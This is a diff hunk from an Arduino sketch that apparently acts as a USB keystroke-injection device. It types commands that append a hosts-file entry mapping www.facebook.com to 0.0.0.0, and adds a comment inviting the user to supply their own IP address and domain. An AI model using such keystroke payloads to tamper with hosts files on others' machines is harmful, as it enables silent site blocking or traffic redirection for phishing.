@@ -33,7 +33,7 @@ void setup()
   Keyboard.print("echo .>> hosts");
   delay(100);
   typeKey(KEY_RETURN);
-  Keyboard.print("echo 0.0.0.0 www.facebook.com >> hosts");
+  Keyboard.print("echo 0.0.0.0 www.facebook.com >> hosts"); //here is your ip address and domain
   typeKey(KEY_RETURN);
   Keyboard.end();
 }
